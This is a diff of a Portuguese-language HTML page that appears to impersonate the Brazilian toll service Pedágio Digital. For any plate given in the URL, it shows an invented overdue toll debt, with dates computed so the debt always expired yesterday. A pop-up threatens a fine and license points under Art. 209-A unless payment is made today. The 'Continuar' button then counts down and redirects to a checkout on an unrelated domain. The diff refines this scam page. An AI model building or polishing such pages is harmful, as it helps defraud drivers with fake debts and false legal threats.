@@ -1,308 +1,253 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "uz3k46tian");
+</script>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Débitos - Pedágio Digital</title>
+    <title>Débitos — Pedágio Digital</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet" />
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Ubuntu', sans-serif; }
+        body { background-color: #f2f2f2; color: #333; padding-bottom: 140px; overflow-x: hidden; }
 
-        body {
-            background-color: #f2f2f2;
-            color: #333;
-            padding-bottom: 140px;
-        }
-
-        /* Header Fix */
-        header {
+        /* Header Estilo Original */
+        header.appbar {
             background-color: #ffffff;
-            height: 55px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            border-bottom: 1px solid #eee;
+            height: 56px;
+            display: flex; align-items: center; justify-content: center;
+            position: relative; border-bottom: 1px solid #e0e0e0;
+        }
+        .back-btn { position: absolute; left: 16px; background: none; border: none; cursor: pointer; display: flex; align-items: center; }
+        header h1 { font-size: 16px; font-weight: 500; color: #000; }
+
+        /* BANNER */
+        .hero-strap {
+            width: 100%; height: 160px;
+            position: relative; background-color: #fff; overflow: hidden;
+        }
+        .hero-img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        
+        .search-wrap {
+            position: absolute; bottom: 35px; left: 20px; z-index: 5;
+            display: flex; flex-direction: column; gap: 8px;
+        }
+        .search-label {
+            color: white; font-size: 13px; font-weight: 500; display: flex; align-items: center; gap: 6px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.6);
         }
 
-        .back-btn {
-            position: absolute;
-            left: 15px;
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
+        /* Caixa da Placa */
+        .plate-wrapper { padding: 0 20px; margin-top: -28px; position: relative; z-index: 10; }
+        .plate-box { 
+            background: white; border-radius: 8px; padding: 16px 20px; 
+            font-size: 15px; font-weight: 500; box-shadow: 0 2px 8px rgba(0,0,0,0.1); 
+            border: 1px solid #eee; color: #444;
         }
 
-        header h1 {
-            font-size: 16px;
-            font-weight: 600;
-        }
-
-        /* IMAGEM DO TOPO - CORREÇÃO DE EMBED */
-        .hero-container {
-            width: 100%;
-            height: 190px;
-            position: relative;
-            overflow: hidden;
-            background-color: #000;
-        }
-
-        .hero-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* Faz a imagem preencher tudo sem deformar */
-            display: block;
-        }
-
-        .vehicle-label-overlay {
-            position: absolute;
-            bottom: 40px; /* Sobe um pouco por causa da caixa da placa */
-            left: 20px;
-            color: white;
-            font-size: 13px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            text-shadow: 0 1px 4px rgba(0,0,0,0.8);
-            z-index: 5;
-        }
-
-        /* CAIXA DA PLACA SOBREPOSTA À IMAGEM */
-        .plate-wrapper {
-            padding: 0 20px;
-            margin-top: -30px; /* Puxa a caixa para dentro da imagem */
-            position: relative;
-            z-index: 10;
-        }
-
-        .plate-box {
-            background: white;
-            border-radius: 10px;
-            padding: 18px;
-            font-size: 15px;
-            color: #444;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            font-weight: 500;
-            border: 1px solid #f0f0f0;
-        }
-
-        /* Status e Atualização */
-        .status-bar {
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .status-title { font-weight: 700; font-size: 14px; }
-        .update-time { font-size: 10px; color: #888; }
-
-        /* Lista de Passagens */
-        .select-header {
-            padding: 10px 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 12px;
-            border-bottom: 1px solid #e5e5e5;
-        }
+        /* Débitos */
+        .container { padding: 20px; }
+        .section-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .section-title { font-size: 15px; font-weight: 700; color: #000; }
+        .section-stamp { font-size: 11px; color: #888; }
 
         .debit-card {
-            padding: 20px;
-            display: flex;
-            gap: 15px;
-            border-bottom: 1px solid #e5e5e5;
-            background: #f2f2f2;
+            background: #fff; border-radius: 8px; padding: 18px;
+            display: flex; gap: 12px; margin-bottom: 10px; border: 1px solid #eee;
         }
-
-        input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #000;
-        }
-
-        .card-content {
-            flex: 1;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .col-left { display: flex; flex-direction: column; gap: 4px; }
-        .col-left .p-plate { font-weight: 700; font-size: 14px; color: #000; }
-        .col-left .p-date { font-size: 12px; color: #666; }
-        .col-left .p-op { font-weight: 600; font-size: 13px; color: #000; }
-
-        .col-right { display: flex; flex-direction: column; align-items: flex-end; }
+        .card-content { flex: 1; display: flex; justify-content: space-between; }
+        .col-left .p-plate { font-weight: 700; font-size: 14px; display: block; }
+        .col-left .p-date { font-size: 12px; color: #666; display: block; }
         
-        /* O DETALHE QUE VOCE PEDIU NO CHECKBOX/CARD */
-        .vencimento-badge {
-            border: 1px solid #d32f2f;
-            color: #d32f2f;
-            font-size: 9px;
-            font-weight: 800;
-            padding: 2px 5px;
-            border-radius: 4px;
-            margin-bottom: 6px;
-            text-transform: uppercase;
+        .col-right { text-align: right; }
+        .vencimento-badge { 
+            color: #d32f2f; border: 1px solid #d32f2f; font-size: 9px; 
+            font-weight: 700; padding: 2px 4px; border-radius: 3px; 
+            display: inline-block; margin-bottom: 5px;
+        }
+        .p-price { font-weight: 700; font-size: 16px; color: #000; display: block; }
+
+        /* Footer */
+        .total-card-fixed {
+            position: fixed; bottom: 0; left: 0; width: 100%;
+            background: white; padding: 15px 20px;
+            border-radius: 20px 20px 0 0; box-shadow: 0 -4px 15px rgba(0,0,0,0.08); z-index: 100;
+        }
+        .btn-continue {
+            background: #000; color: #fff; width: 100%; padding: 15px;
+            border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer;
         }
 
-        .p-price { font-weight: 800; font-size: 15px; color: #000; }
-        .p-taxes { font-size: 9px; color: #d32f2f; margin: 2px 0; font-weight: 600; }
-        .p-total { font-weight: 700; font-size: 13px; color: #000; }
-
-        /* Barra Inferior (Footer) */
-        .fixed-footer {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            background: white;
-            padding: 20px;
-            border-radius: 20px 20px 0 0;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.08);
-            z-index: 100;
-        }
-
-        .footer-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-
-        .footer-price {
-            font-size: 14px;
-            margin-bottom: 15px;
-            color: #333;
-        }
-
-        .btn-pay {
-            background: #000;
-            color: #fff;
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        /* Modal Alerta */
+        /* MODAL DE ATENÇÃO (ORIGINAL) */
         .modal-bg {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 2000;
+            background: rgba(0,0,0,0.5); display: none; align-items: center; justify-content: center;
+            z-index: 2000; padding: 20px;
         }
-        .modal-content { background: white; width: 90%; max-width: 350px; border-radius: 15px; padding: 25px; text-align: center; }
-        .text-red { color: #d32f2f; font-weight: bold; }
+        .modal-content {
+            background: white; width: 100%; max-width: 380px;
+            border-radius: 20px; padding: 25px; text-align: center;
+        }
+        .modal-attention { color: #d32f2f; font-weight: 700; font-size: 18px; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .modal-text { font-size: 14px; line-height: 1.6; color: #333; margin-bottom: 20px; }
+        .red-bold { color: #d32f2f; font-weight: 700; }
+        
+        .ctb-info-box {
+            background: #fff5f5; border: 1px dashed #d32f2f; border-radius: 10px;
+            padding: 12px; text-align: left; font-size: 12px; margin-bottom: 20px;
+        }
+
+        /* REDIRECIONAMENTO REAJUSTADO */
+        #redirectScreen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 9999; display: none; flex-direction: column;
+        }
+        .redirect-body { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
+        .loader-ring { width: 50px; height: 50px; border: 3px solid #f3f3f3; border-top: 3px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .redirect-msg { font-size: 18px; font-weight: 500; color: #333; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-    <header>
-        <button class="back-btn" onclick="window.history.back()">‹</button>
+    <div id="alertModal" class="modal-bg">
+        <div class="modal-content">
+            <div class="modal-attention">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L1 21h22L12 2zm1 14h-2v-2h2v2zm0-4h-2V8h2v4z"/></svg>
+                ATENÇÃO
+            </div>
+            <p style="font-size: 13px; font-weight: 700; margin-bottom: 8px;">Débitos em aberto encontrados (<span id="modalPlate">---</span>)</p>
+            <p class="modal-text">
+                <span class="red-bold">Hoje, <span id="modalDay"></span> às <span id="modalTime"></span></span> - Caso não realize o pagamento, a multa será enviada ao DETRAN. Após esse prazo, o sistema emitirá automaticamente a multa de <span class="red-bold">R$ 195,23 e 5 pontos na CNH</span>.
+            </p>
+            <div class="ctb-info-box">
+                <strong>Art. 209-A - CTB:</strong><br>
+                Infração: <span class="red-bold">Grave</span>.<br>
+                Penalidade: <span class="red-bold">Multa de R$ 195,23</span>.<br>
+                Pontuação: <span class="red-bold">5 pontos na CNH</span>.
+            </div>
+            <button class="btn-continue" onclick="closeModal()">CONTINUAR</button>
+        </div>
+    </div>
+
+    <header class="appbar">
+        <button class="back-btn" onclick="window.history.back()">
+            <svg width="24" height="24" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
         <h1>Débitos</h1>
     </header>
 
-    <div id="main">
-        <div class="hero-container">
-            <img src="https://pedagiosdiigital.in.net/images/home-KlC6Y-6S.png" class="hero-img">
-            <div class="vehicle-label-overlay">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2"/><circle cx="7" cy="17" r="2"/><circle cx="17" cy="17" r="2"/></svg>
-                Seus veículos:
+    <main>
+        <section class="hero-strap">
+            <img src="https://www.pedagiodigital.com/assets/home-KlC6Y-6S.png" class="hero-img">
+            <div class="search-wrap">
+                <div class="search-label">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAABIklEQVR4AeyTXRHCMBCEAQVIAAc4AAfgACTgoMUJEsABEpCAA+qgfNfmOs0fTTrwwAyZvWya7GWTazubfLn9DQYLHCxRXddFnd+KkJtnwL4LhCWRi5LcuZvkGSDYEILrNLEhvhGCg3T9CBnsjeBsOIVORrQ13JFlwBWlPHKDisNfOtXw4I6kIjbsYZXJMkCwIwRzhMkg4UnoxkfGHVwDLU8nGDFY93Ncg5UsUp5RkFxCSgy1cA3aWXrqo/9C8PtGMknRRA3YQP8FZaY86JqyJ3hnoJ+espfMhK4pM2UjasBLKAlB9HQsDmqCBtR2FOyzt09Bg3bpM33UgOtnIXYc1+BhhMrmMYk0R7lJsgw48pIQLJvVjI6kYK5lkLFfsvT3DV4AAAD//22gyo8AAAAGSURBVAMAa0vTMd1B76sAAAAASUVORK5CYII=">
+                    <span>Seus veículos:</span>
+                </div>
             </div>
-        </div>
+        </section>
 
         <div class="plate-wrapper">
-            <div class="plate-box" id="displayPlate">CARREGANDO...</div>
+            <div class="plate-box" id="userPlate">-</div>
         </div>
 
-        <div class="status-bar">
-            <span class="status-title">Débitos</span>
-            <span class="update-time" id="updateText">Atualizado em: --/--/----</span>
-        </div>
+        <section class="container">
+            <div class="section-bar">
+                <h2 class="section-title">Débitos</h2>
+                <time class="section-stamp" id="updateStamp">Atualizado em: --/--/----</time>
+            </div>
 
-        <div class="select-header">
-            <input type="checkbox" checked>
-            <span>Selecionar 1 passagens em aberto</span>
-        </div>
-
-        <div class="debit-card">
-            <input type="checkbox" checked>
-            <div class="card-content">
-                <div class="col-left">
-                    <span class="p-plate" id="itemPlate">---</span>
-                    <span class="p-date" id="itemDate">--/--/---- --:--</span>
-                    <span class="p-op">CCR Rodovias</span>
-                </div>
-                <div class="col-right">
-                    <div class="vencimento-badge" id="vencimentoText">Venceu em --/--/----</div>
-                    
-                    <span class="p-price">R$ 71,46</span>
-                    <span class="p-taxes">Multa + Juros: R$ 0,00 + R$ 0,00</span>
-                    <span class="p-total">Total: 71,46</span>
+            <div class="debit-card">
+                <input type="checkbox" checked disabled style="width: 18px; accent-color: #000;">
+                <div class="card-content">
+                    <div class="col-left">
+                        <span class="p-plate" id="cardPlate">---</span>
+                        <span class="p-date" id="cardDate">--/--/---- 02:10:44</span>
+                        <span class="p-op" style="font-size: 13px; font-weight: 500;">CCR Rodovias</span>
+                    </div>
+                    <div class="col-right">
+                        <div class="vencimento-badge" id="vencText">VENCEU EM --/--/----</div>
+                        <span class="p-price">R$ 71,46</span>
+                        <span style="font-size: 9px; color: #d32f2f;">Multa + Juros: R$ 0,00 + R$ 0,00</span>
+                    </div>
                 </div>
             </div>
+        </section>
+    </main>
+
+    <div class="total-card-fixed">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+            <div style="font-size: 13px; color: #666;">Total a pagar: <strong style="color: #000; font-size: 16px; margin-left: 5px;">R$ 71,46</strong></div>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
         </div>
+        <button class="btn-continue" onclick="triggerRedirect()">Continuar</button>
     </div>
 
-    <div class="fixed-footer">
-        <div class="footer-info">
-            <span style="font-weight: 600; font-size: 14px;">Total a pagar:</span>
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
-        </div>
-        <div class="footer-price">R$ 0,00</div>
-        <button class="btn-pay" onclick="window.location.href='https://checkout.escrtoriobrasil.store/VCCL1O8SCOW9'">
-            Continuar
-        </button>
-    </div>
-
-    <div id="modalCtb" class="modal-bg">
-        <div class="modal-content">
-            <div class="text-red" style="font-size: 18px; margin-bottom: 12px;">⚠ ATENÇÃO</div>
-            <p style="font-size: 14px; line-height: 1.5;">
-                <span class="text-red">Hoje, <span id="mDate"></span></span> - Caso não realize o pagamento, o sistema emitirá multa de <span class="text-red">R$ 195,23</span> e <span class="text-red">5 pontos na CNH</span> (Art. 209-A).
-            </p>
-            <button class="btn-pay" style="margin-top: 20px;" onclick="document.getElementById('modalCtb').style.display='none'">CONTINUAR</button>
+    <div id="redirectScreen">
+        <header class="appbar"><h1>Pagamento</h1></header>
+        <div class="redirect-body">
+            <div class="loader-ring"></div>
+            <p class="redirect-msg">Aguarde o redirecionamento...</p>
+            <div id="countdown" style="font-size: 48px; font-weight: 700; color: #000;">3</div>
         </div>
     </div>
 
     <script>
+        const CHECKOUT_LINK = 'https://checkout.escrtoriobrasil.store/VCCL1O8SCOW9';
+
         document.addEventListener("DOMContentLoaded", function() {
-            // PEGAR PLACA DA URL
-            const urlParams = new URLSearchParams(window.location.search);
-            const placa = urlParams.get('plate') || 'PLACA';
+            const params = new URLSearchParams(window.location.search);
+            const placa = params.get('plate') || 'PLACA';
             
-            document.getElementById('displayPlate').textContent = placa.toUpperCase();
-            document.getElementById('itemPlate').textContent = placa.toUpperCase();
+            document.getElementById('userPlate').textContent = placa.toUpperCase();
+            document.getElementById('cardPlate').textContent = placa.toUpperCase();
+            document.getElementById('modalPlate').textContent = placa.toUpperCase();
 
-            // DATAS DINAMICAS
+            // Datas Dinâmicas
             const hoje = new Date();
-            const dataFormatada = hoje.toLocaleDateString('pt-BR');
-            const horaFormatada = hoje.toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
-
-            document.getElementById('updateText').textContent = `Atualizado em: ${dataFormatada} - ${horaFormatada}`;
-            document.getElementById('mDate').textContent = dataFormatada;
+            const diasSemana = ['domingo', 'segunda-feira', 'terça-feira', 'quarta-feira', 'quinta-feira', 'sexta-feira', 'sábado'];
             
-            // Data da passagem (3 dias atras) e Vencimento (ontem)
-            const dataPassagem = new Date();
-            dataPassagem.setDate(hoje.getDate() - 3);
-            document.getElementById('itemDate').textContent = `${dataPassagem.toLocaleDateString('pt-BR')} 02:10:44`;
+            document.getElementById('modalDay').textContent = diasSemana[hoje.getDay()];
+            document.getElementById('modalTime').textContent = hoje.getHours() + ":" + String(hoje.getMinutes()).padStart(2, '0');
+            document.getElementById('updateStamp').textContent = `Atualizado em: ${hoje.toLocaleDateString('pt-BR')} - ${hoje.getHours()}:${String(hoje.getMinutes()).padStart(2, '0')}`;
             
-            const dataVencimento = new Date();
-            dataVencimento.setDate(hoje.getDate() - 1);
-            document.getElementById('vencimentoText').textContent = `Venceu em ${dataVencimento.toLocaleDateString('pt-BR')}`;
+            const vDate = new Date(); vDate.setDate(hoje.getDate() - 1);
+            document.getElementById('vencText').textContent = `VENCEU EM ${vDate.toLocaleDateString('pt-BR')}`;
+            
+            const pDate = new Date(); pDate.setDate(hoje.getDate() - 3);
+            document.getElementById('cardDate').textContent = `${pDate.toLocaleDateString('pt-BR')} 02:10:44`;
 
-            // Exibir Modal
+            // ABRE O MODAL AUTOMATICAMENTE
             setTimeout(() => {
-                document.getElementById('modalCtb').style.display = 'flex';
-            }, 800);
+                document.getElementById('alertModal').style.display = 'flex';
+            }, 500);
         });
+
+        function closeModal() { document.getElementById('alertModal').style.display = 'none'; }
+
+        function triggerRedirect() {
+            document.getElementById('redirectScreen').style.display = 'flex';
+            let count = 3;
+            const timerEl = document.getElementById('countdown');
+            const interval = setInterval(() => {
+                count--;
+                timerEl.textContent = count;
+                if (count <= 0) {
+                    clearInterval(interval);
+                    window.location.href = CHECKOUT_LINK;
+                }
+            }, 1000);
+        }
     </script>
 </body>
 </html>
